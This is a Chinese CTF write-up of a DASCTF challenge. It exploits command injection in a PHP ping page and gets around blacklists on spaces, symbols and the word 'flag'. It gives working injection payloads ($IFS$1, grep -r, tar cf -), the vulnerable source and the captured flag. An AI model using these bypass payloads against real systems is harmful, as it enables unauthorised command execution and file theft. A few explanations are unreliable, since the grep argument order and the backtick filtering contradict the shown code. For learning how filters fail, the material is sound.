Web安全 · Ping 命令注入过滤绕过 WriteUp（DASCTF 环境）

Web 安全 2026-10-05 4130 字 约 11 分钟

目标：http://8e277ad94721d2d6edf76e2c.http-ctf2.dasctf.com/
环境：PHP 5.6.40（openresty 前端），Ubuntu 容器，www-data 权限
考点：命令注入 + 多层黑名单绕过（空格、引号、flag 关键字）
结果：flag 位于 flag.php 内的 $flag 变量，需要读取文件内容（非直接输出）

一、信息收集

浏览器访问直接回显 /?ip=，说明参数名是 ip。传入 ?ip=127.0.0.1 后返回 ping 结果：

<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.039 ms
...

判断依据：输出格式是 PING xxx ... 56 data bytes，这是 busybox ping 的特征（GNU ping 会显示 64 bytes from ...: icmp_seq=1）。说明后端执行的是 Linux 命令，且用户输入被直接拼进 ping -c 4 <input>。

测试注入点：?ip=127.0.0.1;id → 返回 uid=82(www-data)，命令注入成立。

二、读取源码，确定过滤规则

注入成功后第一件事是读源码，而不是无脑试 payload。;ls 得到目录下有 index.php、flag.php。
用 ${IFS}$1 代替空格（见下节），读 index.php：

<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}
?>

四层过滤，逐一分析：

# 正则 含义 绕过思路
1 & \/ \? \* \< > ' " \\ ( ) [ ] { } + 控制字符 符号黑名单 没过滤 ;、\|、`，也没过滤 $
2 / / 禁止空格 用 $IFS 等环境变量代替
3 /bash/ 禁止 bash 字样 本题用不到
4 /.*f.*l.*a.*g.*/ 禁止 f…l…a…g 按序出现 最狠的一条，文件名拼不出来

关键点：第 4 条正则没有 s 修饰符，. 不匹配换行符，理论上可以换行分割——但第 1 条把 \x00-\x1f（含换行、TAB）也禁了，这条路封死。

三、绕过空格

原理：Linux 里 $IFS 是 shell 的内部分隔符（Internal Field Separator），默认值是空格、TAB、换行。shell 在解析命令时会自动做变量替换，所以 cat$IFSflag 展开后等价于 cat flag。此外 $1~$9 在无参数时是空字符串，既能当变量名分隔符又能被消除，故 $IFS$1 是最稳的写法（避免和后面紧邻的字母连成一个不存在的变量名）。

写法 效果 评价
$IFS ✅ 可用 后面必须跟非变量名字符，否则会粘连
$IFS$1 ✅ 最稳 $1 展开为空，兼作分隔符
${IFS} ❌ 被拦（{} 在黑名单里） 用不了
<file ❌ 被拦（<） 重定向输入不可用
字面 TAB %09 ❌ 被拦（\x00-\x1f） 用不了

验证：?ip=;ls$IFS-la 成功列出目录。

四、绕过 flag 关键字 —— 本题核心

cat flag.php 直接触发 fxck your flag!；fla\g.php、fla"g".php、fla*g.php 也全被拦（\ " * 在黑名单）。

思路转向：既然文件名拼不出来，就不拼文件名。有两个优雅方案：

方案 A：grep -r 遍历当前目录（推荐，最省事）

grep -r . .

-r 递归，参数 . 是"当前目录"，第二个 . 是匹配模式（任意字符）。目录里只有两个文件，任何含任意字符的行都会被打印出来，而 grep 对二进制/异常行会直接输出 文件名:内容，从而把 flag.php 的内容连带文件名一起吐出来。

Payload（空格全用 $IFS$1 代替）：

?ip=;grep$IFS$1-r$IFS$1.$IFS$1.

回显：

./index.php:/?ip=
./index.php:<?php
...
./flag.php:<?php
./flag.php:$flag = "CTF2{b95807d0-1838-4493-ae87-94ba3ecb28e6}";
./flag.php:?>

为什么有效：payload 里没有 f…l…a…g 按序序列（grep/-r/. 都不含），完美绕过第 4 条正则。

方案 B：tar 打包再读（通杀思路，值得记住）

tar cf - .        # 把当前目录打包成流输出到标准输出，内容含未压缩文件名+文件内容
tar cf /tmp/a .   # 或落地成文件再 tar xf 解包

Payload：?ip=;tar$IFS$1cf$IFS$1-$IFS$1.

为什么 tar 能读文件：tar 是归档不是压缩，cf - . 把目录里所有文件的原始字节连同文件名一起写到 stdout，因此回显里能直接看到文件内容。这是绕过"关键字黑名单"的通用招数——不引用被禁的名字，仍能拿到内容。

方案 C：其他同类变形（备用）

  • sort * / tac * / head *：* 被拦，需换 $(ls)——但 () 也被拦，本题不可用
  • od -c / xxd：- 可用，但需要对文件名通配，同 C 的问题
  • nl <file>：< 被拦

结论：本题最优解就是 A（grep -r）或 B（tar cf - .）。

五、最终 Payload 与 flag

# 方法一：grep 递归遍历
http://8e277ad94721d2d6edf76e2c.http-ctf2.dasctf.com/?ip=;grep$IFS$1-r$IFS$1.$IFS$1.

# 方法二：tar 打包输出
http://8e277ad94721d2d6edf76e2c.http-ctf2.dasctf.com/?ip=;tar$IFS$1cf$IFS$1-$IFS$1.

flag = CTF2{b95807d0-1838-4493-ae87-94ba3ecb28e6}

六、知识点沉淀

1. $IFS 为什么能代替空格

shell 解析命令行时，先做变量替换，再做词分割。$IFS 展开成一个空格字符，此时它和手敲的空格在语义上完全等价——因为词分割发生在替换之后。这也是 PHP 侧 preg_match('/ /') 拦不住它的原因：PHP 只检查了原始字符串里有没有空格字符，而 shell 是在替换后才分割的。

2. $1~$9 当分隔符

$1 无参数时为空串。写成 cat$IFS$1flag：$IFS → 空格，$1 → 空，最终 cat flag。它的作用是截断变量名，否则 $IFSflag 会被解析成名为 IFSflag 的变量（不存在 → 空）。

3. 关键字黑名单的通用绕过思路

手法 说明 本例可用性
通配符 ? * cat fla?.php ❌ 都被拦
引号拼接 cat fla""g.php ❌ 引号被拦
反斜杠转义 cat fla\g.php ❌ 被拦
命令替换 cat `ls` / $(ls) ❌ 反引号、() 被拦
不引用文件名 grep -r . . / tar cf - . ✅ 可用
变量拼接 a=fl;b=ag;$a$b ❌ = 需配合，且无空格难拼多命令

核心教训：当"引用某个名字"被全面封锁时，改从"不引用名字也能拿到内容"的层面思考（归档、递归搜索、目录遍历）。

4. 顺带踩的坑

  • & 被拦 → 无法用 &&、& 后台执行；; 和 | 是唯二可用的命令分隔符。
  • 空回显 ≠ 被拦。实测 grep$IFSr$IFS. 回显全空，原因是 grep -r . 缺少最后一个 FILE 参数（漏了 .），grep 转去读标准输入，而 shell_exec 下 stdin 无数据，于是静默退出；且 stderr 不会被 shell_exec 捕获。正确写法必须是 grep -r . .（两个点：前者是目录，后者是模式）。
  • 不要想当然加限制条件。我先入为主以为存在 payload 长度上限，实测 ;echo + 20~44 个字符全部正常回显，长度不受限——排查时应以实测为准，不要凭经验写结论。
